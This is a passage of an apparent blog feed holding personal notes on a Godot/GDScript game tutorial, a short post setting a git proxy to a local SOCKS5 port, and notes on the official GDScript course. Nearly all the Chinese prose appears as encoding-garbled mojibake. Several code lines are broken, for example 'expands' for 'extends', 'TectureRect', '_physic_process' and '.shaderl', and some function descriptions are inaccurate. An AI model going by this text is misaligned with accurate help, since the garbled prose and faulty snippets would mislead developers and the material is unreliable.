åˆ°ä»»æ„ä¸€ä¸ªèŠ‚ç‚¹ä¸‹é¢ï¼Œä½œä¸ºå®ƒçš„å­èŠ‚ç‚¹</li><li>è®¾ç½®å­èŠ‚ç‚¹çš„ä½ç½®</li></ol><h1 id="P11-è¿‘æˆ˜æ”»å‡»çš„Hurtboxesï¼ˆä¼¤å®³æ£€æµ‹æ¡†ï¼‰"><a href="#P11-è¿‘æˆ˜æ”»å‡»çš„Hurtboxesï¼ˆä¼¤å®³æ£€æµ‹æ¡†ï¼‰" class="headerlink" title="P11. è¿‘æˆ˜æ”»å‡»çš„Hurtboxesï¼ˆä¼¤å®³æ£€æµ‹æ¡†ï¼‰"></a>P11. è¿‘æˆ˜æ”»å‡»çš„Hurtboxesï¼ˆä¼¤å®³æ£€æµ‹æ¡†ï¼‰</h1><h2 id="è®²è§£éƒ¨åˆ†-4"><a href="#è®²è§£éƒ¨åˆ†-4" class="headerlink" title="è®²è§£éƒ¨åˆ†"></a>è®²è§£éƒ¨åˆ†</h2><p>æ–°å»ºä¸¤ä¸ªåœºæ™¯ï¼Œä½¿ç”¨ Area2D èŠ‚ç‚¹. å…¶æœ‰ä¸ä½ç½®ç›¸å…³çš„ä¿¡å·.</p><p>åˆ†ä¸º Hurtbox å’Œ Hitbox.</p><p>ç»™èŠ‚ç‚¹æ·»åŠ  CollisionShape2D å­èŠ‚ç‚¹.</p><p>ä¸€ä¸ª Area2D èŠ‚ç‚¹å¿…é¡»è¦æœ‰ CollisionShape2D èŠ‚ç‚¹. å¯ä»¥ç”¨æ¥æ£€æµ‹ç¢°æ’ï¼Œæ£€æµ‹ç©å®¶è¿›å…¥åŒºåŸŸç­‰ (æŸ¥çœ‹å³è¾¹æ çš„ Signals).</p><p>æŠŠ Area2D åœºæ™¯æ·»åŠ åˆ°ä¸€ä¸ªèŠ‚ç‚¹ä¸Š.</p><p>Hurtbox åŠ åœ¨å—åˆ°æ”»å‡»çš„ç‰©ä½“ä¸Šï¼ŒHitbox åŠ åœ¨å‘å‡ºæ”»å‡»çš„ç‰©ä½“ä¸Š.</p><p>å°† Hitbox ç»‘å®šåˆ°å‡»æ‰“åŠ¨ç”»ä¸Š, åˆ›å»ºä¸€ä¸ª Position2D èŠ‚ç‚¹ (å…¶å®é™…ä¸Šå’Œ Node2D å·®ä¸å¤š, åªä¸è¿‡ç”¨çš„æ˜¯åå­—åæ ‡, Node2D ä¹Ÿå¯ä»¥æ·»åŠ  key).</p><p>éœ€è¦ç¡®å®šåœ¨æŸä¸€å¸§æ¿€æ´» Hitbox</p><p>Collision -&gt; Layer å’Œ Mask å¯ä»¥åœ¨ Project Setting -&gt; Layer Names -&gt; 2d Physics ä¸­å‘½å</p><p>æ³¨æ„ Layer å’Œ Mask çš„ä½œç”¨ï¼ŒLayer æ˜¯è®¾ç½®å½“å‰èŠ‚ç‚¹æ‰€åœ¨é‚£ä¸€å±‚, Mask æ˜¯è®¾ç½®å½“å‰èŠ‚ç‚¹ä¼šå’Œé‚£ä¸€å±‚å‘ç”Ÿå…³ç³», è®¾ç½®äº†çš„åˆ™ä¼šè¢«å¤„äº Layer çš„æ‰«æåˆ° (ä¸ºä»€ä¹ˆå« Mask, ä¸æ¸…æ¥š)</p><h2 id="æ­¥éª¤æ€»ç»“-2"><a href="#æ­¥éª¤æ€»ç»“-2" class="headerlink" title="æ­¥éª¤æ€»ç»“"></a>æ­¥éª¤æ€»ç»“</h2><p>æ€è·¯: æ£€æµ‹ç¢°æ’ -&gt; åœ¨æŒ‡å®šäº‹ä»¶å‘ç”Ÿæ—¶è§¦å‘</p><h1 id="P13-è™è å°æ€ªå’Œå‡»é€€æ•ˆæœ"><a href="#P13-è™è å°æ€ªå’Œå‡»é€€æ•ˆæœ" class="headerlink" title="P13. è™è å°æ€ªå’Œå‡»é€€æ•ˆæœ"></a>P13. è™è å°æ€ªå’Œå‡»é€€æ•ˆæœ</h1><h2 id="è®²è§£éƒ¨åˆ†-5"><a href="#è®²è§£éƒ¨åˆ†-5" class="headerlink" title="è®²è§£éƒ¨åˆ†"></a>è®²è§£éƒ¨åˆ†</h2><p>å‡»é€€æ•ˆæœçš„æ€è·¯ï¼Œåœ¨é­é‡ä¼¤å®³æ—¶ç»™ä¸€ä¸ªä¸æ”»å‡»æ–¹å‘ç›¸åŒçš„åˆé€Ÿåº¦ï¼Œç„¶åé€šè¿‡ <code>move_toward()</code> å‡½æ•°è®©è¿™ä¸ªåˆé€Ÿåº¦å˜ä¸ºé›¶.</p><p>ç”¨ <code>onready var swordHitbox = $SwordHisbox</code> è·å–çš„èŠ‚ç‚¹ï¼Œå¯ä»¥è®¿é—®å…¶ä¸­æŒ‚è½½è„šæœ¬çš„å˜é‡å¦‚:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">swordHitbox.knockback_vector</span> = Vector2.ZERO<br></code></pre></td></tr></table></figure><p>å…³äºè¿™ä¸¤è¡Œçš„ç†è§£:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">func _on_Area2D_area_entered(<span class="hljs-built_in">area</span>):<br>knockback = <span class="hljs-built_in">area</span>.knockback_vector * <span class="hljs-number">200</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„å‚æ•° <code>area</code> æ˜¯è¿›å…¥è¿™ä¸ª area çš„ Area2D å¯¹è±¡. <code>knockback_vector</code> æ˜¯è¿™ä¸ªå¯¹è±¡æŒ‚è½½è„šæœ¬é‡Œçš„å˜é‡.</p><p>ä¸€ä¸ªèŠ‚ç‚¹ï¼ŒæŒ‚è½½äº†è„šæœ¬ä¹‹åï¼Œä¼¼ä¹è„šæœ¬ä¸­çš„å˜é‡å¯ä»¥è¢«å½“ä½œæˆå‘˜å˜é‡ä½¿ç”¨.</p><h1 id="P14-æ•Œäººå±æ€§ã€è¾“å‡ºå˜é‡ã€Setgetã€ä»£ç ç»“æ„"><a href="#P14-æ•Œäººå±æ€§ã€è¾“å‡ºå˜é‡ã€Setgetã€ä»£ç ç»“æ„" class="headerlink" title="P14. æ•Œäººå±æ€§ã€è¾“å‡ºå˜é‡ã€Setgetã€ä»£ç ç»“æ„"></a>P14. æ•Œäººå±æ€§ã€è¾“å‡ºå˜é‡ã€Setgetã€ä»£ç ç»“æ„</h1><p>åˆ›å»ºé€šç”¨çš„å±æ€§. å°±æ˜¯æŠŠä¸€éƒ¨åˆ†èŠ‚ç‚¹ä¿å­˜ä¸ºåœºæ™¯ï¼Œåœ¨å…¶ä»–åœºæ™¯ä¸­å¼•ç”¨.</p><p><code>export</code> ä¸€ä¸ªå˜é‡ï¼Œå°±æ˜¯å°†å…¶å˜ä¸ºå¯ä»¥åœ¨ç¼–è¾‘å™¨ä¸­ç›´æ¥ä¿®æ”¹</p><p>ç”¨ <code>export</code> å¸¦å›ºå®šå±æ€§çš„å†™æ³•:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">export</span><span class="hljs-params">(int)</span></span> <span class="hljs-selector-tag">var</span> test = <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„, åœ¨ç¼–è¾‘å™¨ä¸­è·å–çš„æ•°å€¼ï¼Œæ˜¯åœ¨ ready çš„æ—¶å€™æ›´æ–°.</p><p>åˆ›å»ºä¿¡å·, å¦‚:</p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs qml"><span class="hljs-keyword">signal</span><span class="hljs-string"> no_health</span><br></code></pre></td></tr></table></figure><p>å‘é€ä¿¡å·ç¤ºä¾‹:</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">func</span> <span class="hljs-function"><span class="hljs-title">_process</span>():</span><br><span class="hljs-function">    <span class="hljs-variable"><span class="hljs-keyword">if</span></span> <span class="hljs-variable">health</span> &lt;= <span class="hljs-number">0</span>:</span><br><span class="hljs-function">        <span class="hljs-title">emit_signal</span>(<span class="hljs-string">&quot;no_health&quot;</span>)</span><br></code></pre></td></tr></table></figure><p>åœ¨ä¸€ä¸ªå€¼æ”¹å˜æ˜¯è°ƒç”¨ä¸€ä¸ªå‡½æ•°, ä½¿ç”¨ <code>setget</code>:</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gml">onready <span class="hljs-keyword">var</span> <span class="hljs-variable language_">health</span> = max_health setget set_health<br><br>func set_health(value):<br>    <span class="hljs-variable language_">health</span> = value<br></code></pre></td></tr></table></figure><p>è¿™é‡Œï¼Œæ¯å½“ <code>health</code> çš„å€¼å‘ç”Ÿæ”¹å˜ï¼Œå°±ä¼šè°ƒç”¨ <code>set_health()</code> å‡½æ•°. </p><p>æ³¨æ„ â€œå‘ä¸‹è°ƒç”¨ï¼Œå‘ä¸Šä¿¡å·â€, æ„æ€æ˜¯ï¼ŒèŠ‚ç‚¹æ ‘çš„ä¸Šå±‚è¦ä¼ é€’ä¿¡æ¯ç»™ä¸‹å±‚ï¼Œåˆ™ä½¿ç”¨å‡½æ•°ä¼ é€’ï¼Œä¸‹å±‚å‘ä¸Šå±‚ä¼ é€’ä¿¡æ¯ï¼Œåˆ™ä½¿ç”¨ä¿¡å·.</p><p>ä¸€ä¸ªè„šæœ¬å¯ä»¥ç»§æ‰¿å¦ä¸€ä¸ªè„šæœ¬ï¼Œå¦‚:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">expands</span> <span class="hljs-string">&quot;res://Overlap/Hitbox.gd&quot;</span><br></code></pre></td></tr></table></figure><h1 id="P15-å°æ€ªæ­»äº¡æ•ˆæœã€Bugä¿®å¤"><a href="#P15-å°æ€ªæ­»äº¡æ•ˆæœã€Bugä¿®å¤" class="headerlink" title="P15. å°æ€ªæ­»äº¡æ•ˆæœã€Bugä¿®å¤"></a>P15. å°æ€ªæ­»äº¡æ•ˆæœã€Bugä¿®å¤</h1><p>è®¾ç½®æ‰€æœ‰åˆå§‹åŠ¨ç”»çš„ Blend Position ç›¸åŒ.</p><p><code>preload()</code> å‡½æ•°çš„ä½¿ç”¨.</p><h1 id="P16-è™è åŸºç¡€AI"><a href="#P16-è™è åŸºç¡€AI" class="headerlink" title="P16. è™è åŸºç¡€AI"></a>P16. è™è åŸºç¡€AI</h1><p>æ·»åŠ æ£€æµ‹ç©å®¶çš„åŒºåŸŸ. æ·»åŠ  Area2D èŠ‚ç‚¹.</p><p>æ·»åŠ  body_entered å’Œ body_exited ä¿¡å·.</p><p>å…¶ä¿¡å·å‡½æ•°ä¸­:</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">func</span> <span class="hljs-title function_">_on_PlayerDetectZone_body_entered</span><span class="hljs-params">(body)</span>:<br></code></pre></td></tr></table></figure><p>çš„ <code>body</code> åº”è¯¥ä»£è¡¨ä¸€ä¸ªåœºæ™¯å¯¹è±¡.</p><p>ä½¿å›¾ç‰‡æ°´å¹³åè½¬ï¼Œéœ€è¦ä½¿ç”¨ <code>flip_h</code> æˆå‘˜å‡½æ•°.</p><h1 id="P17-ç©å®¶å±æ€§ã€å°æ€ªæ”»å‡»"><a href="#P17-ç©å®¶å±æ€§ã€å°æ€ªæ”»å‡»" class="headerlink" title="P17. ç©å®¶å±æ€§ã€å°æ€ªæ”»å‡»"></a>P17. ç©å®¶å±æ€§ã€å°æ€ªæ”»å‡»</h1><p>æ€è·¯ï¼Œé€šè¿‡åŒºåŸŸæ£€æµ‹æ¥åˆ¤æ–­æ”»å‡».</p><p><code>connect()</code> å‡½æ•°çš„ç”¨æ³•: ä¿¡å·ï¼Œå¯¹è±¡ï¼Œå¯¹è±¡ä¸­çš„å‡½æ•°</p><p>Timer èŠ‚ç‚¹. æœ‰ <code>start()</code> æˆå‘˜å‡½æ•°ï¼Œå‚æ•°æ˜¯ä¸€æ®µæ—¶é—´. å…¶ç»“æŸæ—¶ä¼šå’Œ time_out ä¿¡å·å‘ç”Ÿä½œç”¨.</p><p>è°ƒæ•´ Monitorable å±æ€§ (æˆ– Monitoring)ï¼Œè¾¾åˆ°é‡æ–°å‘é€ä¿¡å·çš„è¦æ±‚.</p><p>æœ‰äº›å±æ€§ä¸èƒ½åœ¨ <code>_physic_process()</code> è¿è¡Œä¸­ç›´æ¥ä¿®æ”¹, éœ€è¦ç”¨ <code>set_deferred()</code> å‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å±æ€§ï¼Œç¬¬äºŒä¸ªæ˜¯å€¼.</p><p>è‡ªåŠ¨åŠ è½½ä¸€ä¸ªåœºæ™¯: Project -&gt; Project Settings -&gt; Autoload -&gt; é€‰æ‹©ä¸€ä¸ªæ–‡ä»¶ -&gt; add</p><h1 id="P18-ç©å®¶ç”Ÿå‘½å€¼UI"><a href="#P18-ç©å®¶ç”Ÿå‘½å€¼UI" class="headerlink" title="P18. ç©å®¶ç”Ÿå‘½å€¼UI"></a>P18. ç©å®¶ç”Ÿå‘½å€¼UI</h1><p>ç»™ world åœºæ™¯æ·»åŠ ä¸€ä¸ªæ–°çš„èŠ‚ç‚¹.</p><p>Godot é‡Œå¤§éƒ¨åˆ† Control èŠ‚ç‚¹éƒ½å’Œ UI æœ‰å…³ç³». å…¶ position å’Œ æ™®é€šçš„ä¸åŒ. å…¶å¾ˆå¤šå±æ€§ä¹Ÿå’Œ node2D ä¸åŒ.</p><p>æœ‰é”šç‚¹å±æ€§ Anchor, å…¶é»˜è®¤ä½äºåŸç‚¹. margin è¡¨ç¤º label çš„å¤§å°.</p><p>åˆ›å»ºä¸€ä¸ª Control èŠ‚ç‚¹ï¼Œå†åˆ›å»ºä¸€ä¸ª label å­èŠ‚ç‚¹. å°†å…¶ä½œä¸ºåœºæ™¯ä¿å­˜.</p><p>å…³äº <code>clamp()</code> å‡½æ•°ï¼Œå…¶å°†ä¸€ä¸ªæ•°æˆªå–. ä¸‰ä¸ªå‚æ•°ï¼Œè¾“å…¥ï¼Œæœ€å°ï¼Œæœ€å¤§.</p><p>ä½¿ç”¨ <code>setget</code> çš„å¥½å¤„æ˜¯ï¼Œå½“ä¸€ä¸ªå˜é‡æ”¹å˜æ—¶ï¼Œä¼šè§¦å‘ä¸€ä¸ªå‡½æ•°.</p><p>ä½¿ç”¨ TectureRect èŠ‚ç‚¹, è®¾ç½®åœ¨æ‹‰ä¼¸æ—¶è‡ªåŠ¨é‡å¤: å³ä¾§è¾¹æ  -&gt; TectureRect -&gt; Stretch Mode -&gt; Tile</p><p>é€šè¿‡é•¿åº¦æ¥åˆ¤æ–­å¿ƒçš„ä¸ªæ•°.</p><p>è®¾ç½®ç”Ÿå‘½å€¼ä¸è¶…è¿‡æœ€å¤§å€¼å¯ä»¥ç”¨ <code>min()</code> å‡½æ•°, å…¶è¿”å›ä¸¤ä¸ªå‚æ•°ä¸­çš„æœ€å°å€¼.</p><p>è®¾ç½® TectureRect èŠ‚ç‚¹å³è¾¹æ  Expand -&gt; on, å°±å¯ä»¥æŠŠ Rect -&gt; Size è®¾ç½®ä¸º 0.</p><p>å®šä¹‰çš„ä¿¡å·åé¢å¯ä»¥åŠ ä¸Šå‚æ•°ï¼Œå¯ä»¥åœ¨ <code>emit_signal()</code> ä¸­å‘é€:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">signal <span class="hljs-built_in">test</span>(value)<br><span class="hljs-function"><span class="hljs-title">emit_signal</span><span class="hljs-params">(<span class="hljs-string">&quot;test&quot;</span>, value1)</span></span><br></code></pre></td></tr></table></figure><p>æ·»åŠ ä¸€ä¸ªé™æ­¢ä¸åŠ¨çš„ç‰©ä½“ä¸€èˆ¬ä½¿ç”¨ StaticBody2D.</p><h1 id="P19-å°æ€ªè½¯ç¢°æ’ã€æ€§èƒ½ç›‘æµ‹"><a href="#P19-å°æ€ªè½¯ç¢°æ’ã€æ€§èƒ½ç›‘æµ‹" class="headerlink" title="P19. å°æ€ªè½¯ç¢°æ’ã€æ€§èƒ½ç›‘æµ‹"></a>P19. å°æ€ªè½¯ç¢°æ’ã€æ€§èƒ½ç›‘æµ‹</h1><p>åˆ›å»ºè½¯ç¢°æ’ï¼Œå…ˆåˆ›å»ºä¸€ä¸ª Area2D èŠ‚ç‚¹ï¼Œæ·»åŠ ä¸€ä¸ª CollisionShape2D å­èŠ‚ç‚¹.</p><p>Area2D çš„æˆå‘˜å‡½æ•° <code>get_overlapping_areas()</code>, åˆ¤æ–­æ˜¯å¦é‡å . å®ç°è½¯ç¢°æ’çš„æ€è·¯æ˜¯è®©é‡å çš„éƒ¨åˆ†åœ¨æ£€æµ‹åˆ°é‡å æ—¶ç§»åŠ¨.</p><p>é€‚å½“å¢åŠ åˆ¤æ–­æ€§å‡½æ•°å¦‚: <code>is_colliding()</code></p><h1 id="P20-é•œå¤´"><a href="#P20-é•œå¤´" class="headerlink" title="P20. é•œå¤´"></a>P20. é•œå¤´</h1><p>æ·»åŠ ä¸€ä¸ªè·Ÿéšè§’è‰²çš„é•œå¤´.</p><p>åœ¨ Player èŠ‚ç‚¹ä¸‹æ·»åŠ ä¸€ä¸ª Camera2D èŠ‚ç‚¹. ä¸ºäº†ä½¿ç”¨è¿™ä¸ªèŠ‚ç‚¹ï¼Œåœ¨å³ä¾§è¾¹æ  Camera2D -&gt; Current -&gt; on</p><p>ä¸ºäº†è®©ç”Ÿå‘½å€¼è·Ÿéšé•œå¤´ï¼Œæ·»åŠ ä¸€ä¸ª Canvaslayer èŠ‚ç‚¹ï¼Œè¿™ä¸ªèŠ‚ç‚¹ä¼šè·Ÿéšé•œå¤´, ç„¶åå°†ç”Ÿå‘½å€¼è®¾ç½®ä¸ºå…¶å­èŠ‚ç‚¹. å¼€å¯å³è¾¹æ çš„ Smoothing -&gt; Enabled -&gt; on ä¼šæ›´å¥½.</p><p>è§£å†³è§’è‰²æ­»äº¡åé•œå¤´è·³è½¬é—®é¢˜. å°† Camera2D èŠ‚ç‚¹ç§»åˆ°å¤–é¢ï¼Œåœ¨ Player ä¸‹æ·»åŠ  RemoteTransform2D èŠ‚ç‚¹ï¼Œè¿™ä¸ªèŠ‚ç‚¹çš„ä½œç”¨æ˜¯ï¼Œä½ ç»™å®ƒä¸€ä¸ªè·¯å¾„ï¼Œå°±å¯ä»¥è®©æŒ‡å®šè·¯å¾„çš„èŠ‚ç‚¹è·Ÿéšè¿™ä¸ªèŠ‚ç‚¹. ç”±äºè¿™ä¸ª RemoteTransform2D èŠ‚ç‚¹æ˜¯è·Ÿéš Player çš„ï¼Œè®© Camera2D èŠ‚ç‚¹è·Ÿéšè¿™ä¸ªèŠ‚ç‚¹ä¹Ÿå°±å¯ä»¥è·Ÿéš Player.</p><p>å¯ä»¥è°ƒæ•´ Camera çš„å¤§å°.</p><h1 id="P21-è™è æ¸¸è¡çŠ¶æ€"><a href="#P21-è™è æ¸¸è¡çŠ¶æ€" class="headerlink" title="P21. è™è æ¸¸è¡çŠ¶æ€"></a>P21. è™è æ¸¸è¡çŠ¶æ€</h1><p>æ·»åŠ ä¸€ä¸ª Node2D èŠ‚ç‚¹ä½œä¸ºæ§åˆ¶èŠ‚ç‚¹ï¼Œå› ä¸ºéœ€è¦è¿™ä¸ªèŠ‚ç‚¹çš„ä½ç½®æ¥ä½œä¸ºæ¸¸è¡çš„åŸå§‹ä½ç½®.</p><p>ç»™è¿™ä¸ªèŠ‚ç‚¹æ·»åŠ ä¸€ä¸ª Timer å­èŠ‚ç‚¹.</p><p>å¯ä»¥è®¾ç½® Timer è‡ªåŠ¨å¼€å§‹ï¼Œä¸”è¿è¡Œä¸€æ¬¡. å³è¾¹æ  One Shot -&gt; on, Autostart -&gt; on</p><p><code>rand_range()</code> å‡½æ•°å¯ä»¥è¿”å›èŒƒå›´å†…çš„éšæœºå€¼, å¦‚: <code>rand_range(-32, 32)</code></p><p>æ•°ç»„çš„ <code>shuffle()</code> å‡½æ•°ï¼Œéšæœºå–å‡ºä¸€ä¸ªå€¼. <code>pop_front()</code> å‡½æ•°ï¼Œé€‰å–æ•°ç»„çš„ç¬¬ä¸€ä¸ªå€¼.</p><p>å‘ Player ç§»åŠ¨:</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">var direction = global_position.direction<span class="hljs-constructor">_to(<span class="hljs-params">player</span>.<span class="hljs-params">global_position</span>)</span><br></code></pre></td></tr></table></figure><p><code>direction_to()</code> å‡½æ•°ï¼Œç›´è¯‘å°±æ˜¯æœå‘ï¼Œä¹Ÿå°±æ˜¯è®¾ç½®å½“å‰ä½ç½®æŒ‡å‘ player ä½ç½®çš„æ–¹å‘å‘é‡.</p><h1 id="P22-éŸ³æ•ˆã€é—ªçƒç‰¹æ•ˆï¼ˆç€è‰²å™¨ï¼‰"><a href="#P22-éŸ³æ•ˆã€é—ªçƒç‰¹æ•ˆï¼ˆç€è‰²å™¨ï¼‰" class="headerlink" title="P22. éŸ³æ•ˆã€é—ªçƒç‰¹æ•ˆï¼ˆç€è‰²å™¨ï¼‰"></a>P22. éŸ³æ•ˆã€é—ªçƒç‰¹æ•ˆï¼ˆç€è‰²å™¨ï¼‰</h1><p>åœ¨ Player èŠ‚ç‚¹ä¸‹æ·»åŠ  AudioStreamPlayer å­èŠ‚ç‚¹ (å…¶å’Œ AudioStreamPlayer2D çš„åŒºåˆ«æ˜¯ï¼Œåè€…åœ¨é è¿‘æ—¶éŸ³é‡ä¼šæ”¹å˜).</p><p>åœ¨ AnimationPlayer ä¸­çš„ä¸‹è¾¹æ  Animation ä¸­ Add Track å¯ä»¥æ·»åŠ  AudioStreamPlayer, ç”¨äºåˆ†é…éŸ³é¢‘.</p><p>æ²¡æœ‰åœ¨åŒä¸€ä¸ªèŠ‚ç‚¹æ ‘ä¸­çš„èŠ‚ç‚¹ï¼Œå¯ä»¥é€šè¿‡ <code>preload()</code> æ¥åŠ è½½. ä½†ä½¿ç”¨æ˜¯éœ€è¦å…ˆç”¨ <code>instance()</code> åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œç„¶åé€šè¿‡ <code>get_tree().current_scene.add_child()</code> æ¥å°†è¿™ä¸ªåœºæ™¯æ·»åŠ åˆ°æ ‘ä¸­.</p><p>é—ªçƒç‰¹æ•ˆåŒæ ·æ·»åŠ  AnimationPlayer å­èŠ‚ç‚¹.</p><p>ä½¿ç”¨ Godot çš„ Shader, ç‚¹å‡» Sprite, ç„¶åå³è¾¹æ ä¸‹æ–¹ Material -&gt; Material -&gt; New ShaderMaterial -&gt; Shader -&gt; NewShader, shader åŒæ ·ç”¨ä»£ç æ§åˆ¶ï¼Œä¿å­˜ä»¥ <code>.shaderl</code> ä¸ºåç¼€çš„æ–‡ä»¶.</p><p>Godot çš„ shader è¯­è¨€ï¼Œæœ‰åˆ†å·. å’Œ C++ ç±»ä¼¼.</p><p>å¯æ“ä½œæ¯ä¸ªåƒç´ çš„é¢œè‰².</p><p>åœ¨ Shader ä¸­ï¼Œåº”è¯¥é¿å…ä½¿ç”¨ <code>if</code> è¯­å¥.</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>è®¾ç½®-git-çš„ä»£ç†</title>
    <link href="/2022/11/12/%E8%AE%BE%E7%BD%AE-git-%E7%9A%84%E4%BB%A3%E7%90%86/"/>
    <url>/2022/11/12/%E8%AE%BE%E7%BD%AE-git-%E7%9A%84%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p>å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ git config --global http.proxy socks5h://127.0.0.1:1080<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Learn-GDScript-å®˜æ–¹æ•™ç¨‹</title>
    <link href="/2022/11/12/Learn-GDScript-%E5%AE%98%E6%96%B9%E6%95%99%E7%A8%8B/"/>
    <url>/2022/11/12/Learn-GDScript-%E5%AE%98%E6%96%B9%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="1-What-Code-is-like"><a href="#1-What-Code-is-like" class="headerlink" title="1. What Code is like"></a>1. What Code is like</h1><p>GDScript çš„è¯­æ³•å’Œ Python ç±»ä¼¼ï¼Œä¹Ÿæ˜¯ç”¨ç¼©è¿›åˆ¤æ–­å±‚æ¬¡, ä»£ç å—ç”¨ <code>:</code> å¼€å§‹.</p><h1 id="2-Your-First-Error"><a href="#2-Your-First-Error" class="headerlink" title="2. Your First Error"></a>2. Your First Error</h1><p>æ³¨é‡Šç¬¦æ˜¯ <code>#</code>.</p><h1 id="3-We-Stand-on-the-Shoulders-of-Giants"><a href="#3-We-Stand-on-the-Shoulders-of-Giants" class="headerlink" title="3. We Stand on the Shoulders of Giants"></a>3. We Stand on the Shoulders of Giants</h1><p>è°ƒç”¨ <code>show()</code> å‡½æ•°è®© something visible, è°ƒç”¨ <code>hide()</code> éšè—è¿™äº› entity.</p><p>ä½¿ç”¨ <code>func</code> å…³é”®è¯å®šä¹‰å‡½æ•°:</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">func</span> <span class="hljs-function"><span class="hljs-title">run</span>():</span><br><span class="hljs-function">    <span class="hljs-title">hide</span>()</span><br></code></pre></td></tr></table></figure><p><code>rotate()</code> å‡½æ•°è®© sprite æ—‹è½¬:</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">func</span> <span class="hljs-function"><span class="hljs-title">run</span>():</span><br><span class="hljs-function">    <span class="hljs-title">rotate</span>(<span class="hljs-number">0.3</span>)</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>0.3</code> æ˜¯å¼§åº¦å€¼.</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-built_in">degrees</span> = <span class="hljs-built_in">radians</span> * <span class="hljs-number">180</span> / <span class="hljs-built_in">PI</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>move_local_x()</code> å‡½æ•°ï¼Œå¯ä»¥è®© character å·¦å³ç§»åŠ¨.</p><p><code>move_local_y()</code> å‡½æ•°å¯ä»¥è®© sprite ä¸Šä¸‹ç§»åŠ¨.</p><p>æ³¨æ„ 2D æ¸¸æˆè®¾è®¡ä¸­çš„åæ ‡ç³»æ˜¯å·¦ä¸Šè§’ä¸ºåŸç‚¹.</p><h1 id="4-Drawing-a-Rectangle"><a href="#4-Drawing-a-Rectangle" class="headerlink" title="4. Drawing a Rectangle"></a>4. Drawing a Rectangle</h1><h2 id="Meet-the-turtle"><a href="#Meet-the-turtle" class="headerlink" title="Meet the turtle"></a>Meet the turtle</h2><p>ä¸‰ä¸ªå‡½æ•°:</p><ul><li><code>move_forward(pixels)</code>, å‘å‰ç§»åŠ¨</li><li><code>turn_right(degrees)</code>, å‘å³è½¬</li><li><code>turn_left(degrees)</code></li></ul><h1 id="5-Coding-Your-First-Function"><a href="#5-Coding-Your-First-Function" class="headerlink" title="5. Coding Your First Function"></a>5. Coding Your First Function</h1><p>åœ¨ç¼–ç¨‹ä¸­ä¸è¯´ â€œnamesâ€ è€Œæ˜¯è¯´ â€œidentifiersâ€.</p><p>ä½¿ç”¨å‡½æ•°ä¸»è¦æ˜¯ä¸ºäº†å¤ç”¨.</p><p>å‘½åä¹ æƒ¯:</p><ul><li><code>move_forward()</code></li><li><code>moveForward()</code></li></ul><h2 id="Instantly-moving-the-turtle-to-a-different-position"><a href="#Instantly-moving-the-turtle-to-a-different-position" class="headerlink" title="Instantly moving the turtle to a different position"></a>Instantly moving the turtle to a different position</h2><p>ä½¿ç”¨ <code>jump(x,y)</code> å‡½æ•°. ä¸ä¼šåˆ’çº¿.</p><h1 id="6-Your-First-Function-Parameter"><a href="#6-Your-First-Function-Parameter" class="headerlink" title="6. Your First Function Parameter"></a>6. Your First Function Parameter</h1><p>GDScript ä¸­å®šä¹‰å‡½æ•°æ—¶çš„å‚æ•°åªæœ‰å‚æ•°åï¼Œå¯ä»¥ä¸åŠ ç±»å‹, å¦‚:</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">func</span> <span class="hljs-title function_">rotate</span><span class="hljs-params">(radiations)</span>:<br>    ...<br></code></pre></td></tr></table></figure><p>åŠ ç±»å‹å¦‚:</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">func</span> <span class="hljs-title function_">rotate</span>(<span class="hljs-params">radiations</span>: float):<br>    <span 